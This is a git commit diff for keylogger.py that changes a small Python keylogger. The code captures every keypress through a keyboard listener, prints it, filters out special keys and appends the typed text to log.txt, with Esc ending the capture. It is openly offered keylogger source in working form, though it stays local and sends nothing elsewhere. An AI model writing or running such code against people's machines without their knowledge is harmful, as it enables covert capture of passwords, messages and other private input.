f5f6824642b1403c57f4a89b174abde7c8739ffb
gorakh999 <gorakhgupta999@gmail.com>
2020-12-26 14:46:56 +0530

    .

--- keylogger.py
+++ keylogger.py
@@ -7,20 +7,26 @@ keys = []
 def on_press(key):
     global count, keys
 
-    print(f"{key} is Pressed")
     keys.append(str(key))
     count = count + 1
-    if count == 10:
-        count = 0
-        k1 = ' '.join(keys)
-        with open('log.txt', 'a') as f:
-            f.write(str(k1))
-            f.write('\n')
+    print(f"{key} is Pressed")
+    # if count >= 6:
+    count = 0
+    write_file(keys)
+    keys = []
 
-        keys = []
+def write_file(keys):
+    with open('log.txt', 'a') as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
 
 def on_release(key):
-    pass
+    if key == Key.esc:
+        return False
 
 with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
